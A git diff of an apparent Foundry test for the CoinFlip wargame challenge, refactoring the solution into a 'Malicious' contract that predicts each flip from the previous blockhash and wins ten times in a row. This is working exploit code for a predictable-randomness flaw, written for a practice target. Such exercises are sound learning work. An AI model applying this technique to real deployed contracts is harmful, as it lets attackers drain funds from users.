@@ -8,42 +8,22 @@ import "../src/CoinFlip.sol";
 
 contract CoinFlipTest is Test{
     CoinFlip instanceAddress;
-    address coinflip;
     
-
     address attacker = mkaddr("attacker");
 
     function setUp() public{
         instanceAddress = new CoinFlip();
-        //interacting with the instance contract
-        coinflip = address(CoinFlip(instanceAddress));
     }
       
     function testHackCoinFlip() public {
         vm.startPrank(attacker);
-        uint8 consecutiveLimit = 10;
-       
-        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
-
-        
-        for(uint256 i = 0; i < consecutiveLimit; i += 1){
-            uint256 blockValue = uint256(blockhash(block.number - 1));
-            uint256 coinFlip = uint256(blockValue / FACTOR);
-            
-            assertEq(instanceAddress.flip(coinFlip == 1 ? true : false), true );
-
-            if(instanceAddress.consecutiveWins() == consecutiveLimit){
-                break;
-            }
-            // move block.number forward by 1 
-            uint256 targetBlock = block.number + 1;
-            vm.roll(targetBlock);
-        }
+        Malicious mal = new Malicious(instanceAddress);
+        mal.guessTenTimes();
+      
        
         vm.stopPrank();
 
     }
-
 
     function mkaddr(string memory name) public returns (address) {
         address addr = address(
@@ -52,4 +32,31 @@ contract CoinFlipTest is Test{
         vm.label(addr, name);
         return addr;
     }
+}
+
+contract Malicious is Test{ 
+    CoinFlip immutable instanceAddress;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    constructor ( CoinFlip _instanceAddress){
+        instanceAddress = CoinFlip(_instanceAddress);
+    }
+    function guessTenTimes() public{
+        uint8 consecutiveLimit = 10;
+        
+        for(uint256 i = 0; i < consecutiveLimit; i++){
+            uint256 blockValue = uint256(blockhash(block.number - 1));
+            uint256 coinFlip = uint256(blockValue / FACTOR);
+            
+            assertEq(instanceAddress.flip(coinFlip == 1 ? true : false), true);
+
+            if(instanceAddress.consecutiveWins() == consecutiveLimit){
+                break;
+            }
+             // move block.number forward by 1 
+            uint256 targetBlock = block.number + 1;
+
+            vm.roll(targetBlock);
+    }
+}
 }
